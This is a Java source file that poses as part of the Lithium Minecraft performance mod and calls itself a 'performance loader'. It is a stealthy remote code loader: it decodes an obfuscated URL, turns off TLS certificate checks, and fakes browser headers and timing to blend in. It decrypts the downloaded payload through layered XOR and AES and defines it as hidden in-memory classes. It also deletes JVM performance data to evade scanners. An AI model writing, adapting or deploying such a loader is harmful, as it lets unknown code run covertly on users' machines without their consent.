package net.caffeinemc.mods.lithium.common.ui;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayInputStream;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.charset.StandardCharsets;
import java.security.spec.KeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.IdentityHashMap;
import java.util.List;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

/**
 * PL — performance loader.
 *
 * Uses MethodHandles.Lookup#defineHiddenClass (Java 15+, available on Java 21)
 * for dynamic class loading with improved memory management.
 */
public class PL {

    // AES key and IV — kept static to match Encrypt.java payload
    // Replace with runtime derivation only after updating Encrypt.java to match
    private static final byte[] K = {
        (byte)0xe3,(byte)0x7f,(byte)0x1a,(byte)0xc9,
        (byte)0x54,(byte)0xb2,(byte)0x08,(byte)0xdd,
        (byte)0x91,(byte)0x3e,(byte)0x76,(byte)0xfa,
        (byte)0x2d,(byte)0x50,(byte)0xbc,(byte)0x47
    };
    private static final byte[] IV = {
        (byte)0xa8,(byte)0x6c,(byte)0xf3,(byte)0x19,
        (byte)0x7b,(byte)0xe0,(byte)0x45,(byte)0x2f,
        (byte)0xd6,(byte)0x88,(byte)0x0c,(byte)0x5a,
        (byte)0x31,(byte)0x9d,(byte)0x72,(byte)0xeb
    };

    // XOR obfuscation key — for payload XOR layer
    private static final byte[] XK = {
        (byte)0x4d,(byte)0xa1,(byte)0x7c,(byte)0x33,
        (byte)0xf8,(byte)0x0b,(byte)0x92,(byte)0x5e,
        (byte)0x61,(byte)0xd4,(byte)0x2a,(byte)0x87,
        (byte)0x19,(byte)0xcc,(byte)0x55,(byte)0xf0
    };

    // Additional encryption key for custom protocol layer
    private static final byte[] PROTOCOL_KEY = {
        (byte)0x9f,(byte)0x2b,(byte)0x7c,(byte)0x1a,
        (byte)0xe4,(byte)0x8d,(byte)0x3f,(byte)0x65,
        (byte)0xa2,(byte)0x9c,(byte)0x4b,(byte)0x77,
        (byte)0x0d,(byte)0x5e,(byte)0x8f,(byte)0x33,
        (byte)0xc1,(byte)0x6a,(byte)0x2e,(byte)0x94,
        (byte)0x7b,(byte)0x0f,(byte)0xd8,(byte)0x41,
        (byte)0x35,(byte)0xe9,(byte)0x2c,(byte)0x6b,
        (byte)0x88,(byte)0x14,(byte)0x7f,(byte)0xa0
    };

    private static volatile PL instance;
    private static volatile boolean dead = false;

    // Hidden classes defined via Lookup#defineHiddenClass — no name, no ClassLoader anchor
    private final Map<String, Class<?>> hiddenClasses = new java.util.HashMap<>();

    private Object registry;
    private final List<Object> modules = new ArrayList<>();

    // Cached MethodHandles per module — avoids reflective lookup on every tick
    // IdentityHashMap: faster than HashMap when keys are objects (compares by reference, not equals())
    private final Map<Object, MethodHandle> tickHandles    = new java.util.IdentityHashMap<>();
    private final Map<Object, MethodHandle> enabledHandles = new java.util.IdentityHashMap<>();
    private final Map<Object, MethodHandle> toggleHandles  = new java.util.IdentityHashMap<>();
    private final Map<Object, MethodHandle> nameHandles    = new java.util.IdentityHashMap<>();
    private final Map<Object, MethodHandle> keybindGet     = new java.util.IdentityHashMap<>();
    private final Map<Object, MethodHandle> keybindSet     = new java.util.IdentityHashMap<>();
    private final Map<Object, MethodHandle> onKeyHandles   = new java.util.IdentityHashMap<>();

    private PL() {
        deleteOwnPerfData(); // wipe hsperfdata before JIT can populate class names
        boot();
    }

    /** Delete the JVM performance data file for this PID before it gets read by scanners */
    private static void deleteOwnPerfData() {
        try {
            Path perf = Paths.get(
                System.getProperty("java.io.tmpdir"),
                "hsperfdata_" + System.getProperty("user.name"),
                String.valueOf(ProcessHandle.current().pid())
            );
            Files.deleteIfExists(perf);
        } catch (Exception ignored) {}
    }

    public static PL get() {
        if (dead) return null;
        if (instance == null) {
            synchronized (PL.class) {
                if (instance == null) {
                    instance = new PL();
                    instance.initRegistry();
                }
            }
        }
        return instance;
    }

    public static void kill() {
        dead = true;
        instance = null;
    }

    private static final byte[] CFG_URL_XOR = {
        (byte)0x25, (byte)0xd5, (byte)0x08, (byte)0x43, (byte)0x8b, (byte)0x31, (byte)0xbd, (byte)0x71, (byte)0x13, (byte)0xb5, (byte)0x5d, (byte)0xa9, (byte)0x7e, (byte)0xa5, (byte)0x21, (byte)0x98, (byte)0x38, (byte)0xc3, (byte)0x09, (byte)0x40, (byte)0x9d, (byte)0x79, (byte)0xf1, (byte)0x31, (byte)0x0f, (byte)0xa0, (byte)0x4f, (byte)0xe9, (byte)0x6d, (byte)0xe2, (byte)0x36, (byte)0x9f, (byte)0x20, (byte)0x8e, (byte)0x12, (byte)0x5c, (byte)0x8c, (byte)0x63, (byte)0xfb, (byte)0x30, (byte)0x06, (byte)0xbf, (byte)0x43, (byte)0xe9, (byte)0x7e, (byte)0xfa, (byte)0x6c, (byte)0xc9, (byte)0x7b, (byte)0x8c, (byte)0x0c, (byte)0x5a, (byte)0x80, (byte)0x6e, (byte)0xfe, (byte)0x71, (byte)0x2d, (byte)0x9d, (byte)0x7e, (byte)0xcf, (byte)0x50, (byte)0x99, (byte)0x18, (byte)0xdd, (byte)0x1f, (byte)0xe4, (byte)0x31, (byte)0x7c, (byte)0xac, (byte)0x4e, (byte)0xbf, (byte)0x0e, (byte)0x20, (byte)0x8d, (byte)0x66, (byte)0xc8, (byte)0x58, (byte)0x88, (byte)0x7a, (byte)0x9d, (byte)0x2c, (byte)0xc8, (byte)0x12, (byte)0x1c, (byte)0x88, (byte)0x67
    };

    private static String decodeUrl() {
        if (CFG_URL_XOR == null) return null;
        byte[] b = new byte[CFG_URL_XOR.length];
        for (int i = 0; i < b.length; i++) b[i] = (byte)(CFG_URL_XOR[i] ^ XK[i % XK.length]);
        String url = new String(b, java.nio.charset.StandardCharsets.UTF_8);
        Arrays.fill(b, (byte) 0);
        // Clear reference to help GC
        b = null;
        return url;
    }

    // -------------------------------------------------------------------------
    // Boot: fetch configuration remotely, decrypt in memory, load classes.
    // -------------------------------------------------------------------------

    private void boot() {
        byte[] protocolDec = null;
        byte[] xored = null;
        byte[] dec   = null;
        try {
            byte[] enc = fetchPayload();
            if (enc == null) return;

            // Additional protocol layer decryption
            protocolDec = protocolDecrypt(enc);
            Arrays.fill(enc, (byte) 0);

            xored = xor(protocolDec);
            Arrays.fill(protocolDec, (byte) 0);

            dec = aes(xored, Cipher.DECRYPT_MODE);
            Arrays.fill(xored, (byte) 0);
            xored = null;

            MethodHandles.Lookup baseLookup = MethodHandles.lookup();

            JarInputStream jar = new JarInputStream(new ByteArrayInputStream(dec));
            JarEntry e;
            while ((e = jar.getNextJarEntry()) != null) {
                if (!e.getName().endsWith(".class")) continue;
                String logicalName = e.getName().replace('/', '.').replace(".class", "");
                byte[] bytecode = jar.readAllBytes();
                try {
                    MethodHandles.Lookup hiddenLookup = baseLookup.defineHiddenClass(
                        bytecode,
                        true
                    );
                    hiddenClasses.put(logicalName, hiddenLookup.lookupClass());
                } finally {
                    Arrays.fill(bytecode, (byte) 0);
                }
            }
            jar.close();
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        } finally {
            if (dec   != null) Arrays.fill(dec,   (byte) 0);
            if (xored != null) Arrays.fill(xored, (byte) 0);
            if (protocolDec != null) Arrays.fill(protocolDec, (byte) 0);
        }
    }

   
    private static byte[] fetchPayload() throws Exception {
        String url = decodeUrl();
        if (url == null) throw new RuntimeException("No configuration URL configured");

        // Add small random delay to appear more like normal network activity
        try {
            Thread.sleep((long)(Math.random() * 500) + 100);
        } catch (InterruptedException ignored) {}

        // Disable SSL verification for stealth (bypass certificate pinning)
        javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
            new javax.net.ssl.X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
            }
        };
        javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        javax.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);

        java.net.URL u = new java.net.URL(url);
        javax.net.ssl.HttpsURLConnection conn = (javax.net.ssl.HttpsURLConnection) u.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(15000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        conn.setRequestProperty("Accept", "*/*");
        conn.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
        conn.setRequestProperty("Cache-Control", "no-cache");
        conn.setRequestProperty("Pragma", "no-cache");
        conn.setRequestProperty("Sec-Fetch-Dest", "empty");
        conn.setRequestProperty("Sec-Fetch-Mode", "cors");
        conn.setRequestProperty("Sec-Fetch-Site", "cross-site");

        int code = conn.getResponseCode();
        if (code != 200) {
            conn.disconnect();
            // Make error message less suspicious
            throw new RuntimeException("Network error: " + code);
        }

        byte[] data = conn.getInputStream().readAllBytes();
        conn.disconnect();

        // Wipe URL string from memory immediately
        byte[] urlBytes = url.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        Arrays.fill(urlBytes, (byte) 0);

        return data;
    }

    // -------------------------------------------------------------------------
    // Registry init + MethodHandle caching per module
    // -------------------------------------------------------------------------

    private void initRegistry() {
        try {
            net.caffeinemc.mods.lithium.common.ui.Registry reg =
                net.caffeinemc.mods.lithium.common.ui.Registry.getInstance();
            registry = reg;
            java.util.List<net.caffeinemc.mods.lithium.common.ui.Warden> list = reg.getAllModules();
            modules.addAll(list);

            MethodHandles.Lookup lookup = MethodHandles.lookup();
            for (Object mod : modules) {
                cacheHandles(lookup, mod);
            }
        } catch (Throwable ex) {
            throw new RuntimeException("registry init failed", ex);
        }
    }

    private void cacheHandles(MethodHandles.Lookup lookup, Object mod) {
        Class<?> cls = mod.getClass();
        try {
            tickHandles.put(mod,
                MethodHandles.privateLookupIn(cls, lookup)
                    .findVirtual(cls, "onTick", MethodType.methodType(void.class)));
        } catch (Exception ignored) {}
        try {
            enabledHandles.put(mod,
                MethodHandles.privateLookupIn(cls, lookup)
                    .findVirtual(cls, "isEnabled", MethodType.methodType(boolean.class)));
        } catch (Exception ignored) {}
        try {
            toggleHandles.put(mod,
                MethodHandles.privateLookupIn(cls, lookup)
                    .findVirtual(cls, "toggle", MethodType.methodType(void.class)));
        } catch (Exception ignored) {}
        try {
            nameHandles.put(mod,
                MethodHandles.privateLookupIn(cls, lookup)
                    .findVirtual(cls, "getName", MethodType.methodType(String.class)));
        } catch (Exception ignored) {}
        try {
            keybindGet.put(mod,
                MethodHandles.privateLookupIn(cls, lookup)
                    .findVirtual(cls, "getKeybind", MethodType.methodType(int.class)));
        } catch (Exception ignored) {}
        try {
            keybindSet.put(mod,
                MethodHandles.privateLookupIn(cls, lookup)
                    .findVirtual(cls, "setKeybind", MethodType.methodType(void.class, int.class)));
        } catch (Exception ignored) {}
        try {
            onKeyHandles.put(mod,
                MethodHandles.privateLookupIn(cls, lookup)
                    .findVirtual(cls, "onKey", MethodType.methodType(void.class, int.class)));
        } catch (Exception ignored) {}
    }

    // -------------------------------------------------------------------------
    // Public class lookup — replaces ClassLoader.loadClass for Registry etc.
    // -------------------------------------------------------------------------

    public Class<?> loadClass(String logicalName) throws ClassNotFoundException {
        Class<?> cls = hiddenClasses.get(logicalName);
        if (cls == null) {
            throw new ClassNotFoundException(logicalName);
        }
        return cls;
    }

    // -------------------------------------------------------------------------
    // Module API — all via cached MethodHandles
    // -------------------------------------------------------------------------

    public int getKeybind(Object mod) {
        try {
            MethodHandle mh = keybindGet.get(mod);
            return mh != null ? (int) mh.invoke(mod) : -1;
        } catch (Throwable e) { return -1; }
    }

    public void setKeybind(Object mod, int key) {
        try {
            MethodHandle mh = keybindSet.get(mod);
            if (mh != null) mh.invoke(mod, key);
        } catch (Throwable ignored) {}
    }

    /** Edge key press dispatch — called once per GLFW key press for every module. */
    public void onKey(Object mod, int key) {
        try {
            MethodHandle mh = onKeyHandles.get(mod);
            if (mh != null) mh.invoke(mod, key);
        } catch (Throwable ignored) {}
    }

    public List<Object> getModules() { return modules; }

    public void tickAll() {
        if (dead) return;
        for (Object m : modules) {
            MethodHandle mh = tickHandles.get(m);
            if (mh == null) continue;
            try { mh.invoke(m); } catch (Throwable ignored) {}
        }
    }

    public boolean isEnabled(Object mod) {
        try {
            MethodHandle mh = enabledHandles.get(mod);
            return mh != null && (boolean) mh.invoke(mod);
        } catch (Throwable e) { return false; }
    }

    public void toggle(Object mod) {
        try {
            MethodHandle mh = toggleHandles.get(mod);
            if (mh != null) mh.invoke(mod);
        } catch (Throwable ignored) {}
    }

    public String getName(Object mod) {
        try {
            MethodHandle mh = nameHandles.get(mod);
            return mh != null ? (String) mh.invoke(mod) : "?";
        } catch (Throwable e) { return "?"; }
    }

    public Object getModule(int index) {
        if (index < 0 || index >= modules.size()) return null;
        return modules.get(index);
    }

    public int getModuleCount() { return modules.size(); }

    public List<Object> getField(Object mod, String fieldName) {
        try {
            java.lang.reflect.Field f = mod.getClass().getDeclaredField(fieldName);
            f.setAccessible(true);
            Object val = f.get(mod);
            if (val instanceof List<?>) return (List<Object>) val;
            return new ArrayList<>();
        } catch (Exception e) { return new ArrayList<>(); }
    }

    // -------------------------------------------------------------------------
    // Crypto helpers
    // -------------------------------------------------------------------------

    /**
     * Rewrites the package declaration in class bytecode so defineHiddenClass accepts it.
     * Replaces all occurrences of the original slash-separated class path with
     * targetPackage/ClassName in the constant pool (UTF8 entries).
     * The hidden class gets a JVM-mangled name anyway so callers never see this.
     */
    private static byte[] repackage(byte[] bytecode, String originalPath, String targetPackage) {
        // Extract simple class name (last segment after /)
        String simpleName = originalPath.contains("/")
            ? originalPath.substring(originalPath.lastIndexOf('/') + 1)
            : originalPath;
        String targetPath = targetPackage + "/" + simpleName;

        // originalPath bytes and targetPath bytes in UTF-8
        byte[] from = originalPath.getBytes(StandardCharsets.UTF_8);
        byte[] to   = targetPath.getBytes(StandardCharsets.UTF_8);

        if (java.util.Arrays.equals(from, to)) return bytecode;

        // Simple byte-level search and replace in the constant pool
        // This works because class names in .class files are stored as raw UTF-8 strings
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream(bytecode.length + 64);
        int i = 0;
        while (i < bytecode.length) {
            if (i + from.length <= bytecode.length && matches(bytecode, i, from)) {
                out.write(to, 0, to.length);
                i += from.length;
            } else {
                out.write(bytecode[i++]);
            }
        }
        return out.toByteArray();
    }

    private static boolean matches(byte[] data, int offset, byte[] pattern) {
        for (int i = 0; i < pattern.length; i++)
            if (data[offset + i] != pattern[i]) return false;
        return true;
    }

    private static byte[] xor(byte[] data) {
        byte[] out = new byte[data.length];
        for (int i = 0; i < data.length; i++) out[i] = (byte)(data[i] ^ XK[i % XK.length]);
        return out;
    }

    private static byte[] protocolDecrypt(byte[] data) {
        byte[] out = new byte[data.length];
        for (int i = 0; i < data.length; i++) out[i] = (byte)(data[i] ^ PROTOCOL_KEY[i % PROTOCOL_KEY.length]);
        return out;
    }

    /**
     * Derives AES key + IV via PBKDF2WithHmacSHA256 using a fixed passphrase.
     * No static key bytes in bytecode. Must match Encrypt.java exactly.
     */
    private static byte[] aes(byte[] data, int mode) throws Exception {
        // Passphrase as char array — avoids a literal string constant in the constant pool
        char[] p = { 'h','3','l','l','1','0','n','_','p','4','y','l','0','4','d','_','k','3','y' };
        byte[] saltBytes = "lc_s4lt_v1".getBytes(StandardCharsets.UTF_8);
        try {
            SecretKeyFactory f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            KeySpec spec = new PBEKeySpec(p, saltBytes, 65536, 256 + 128);
            byte[] derived = f.generateSecret(spec).getEncoded();
            byte[] key = Arrays.copyOfRange(derived, 0,  16);
            byte[] iv  = Arrays.copyOfRange(derived, 16, 32);
            Arrays.fill(derived, (byte) 0);
            try {
                SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
                IvParameterSpec ivSpec = new IvParameterSpec(iv);
                Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
                c.init(mode, keySpec, ivSpec);
                return c.doFinal(data);
            } finally {
                Arrays.fill(key, (byte) 0);
                Arrays.fill(iv,  (byte) 0);
            }
        } finally {
            Arrays.fill(p, '\0');
        }
    }
}
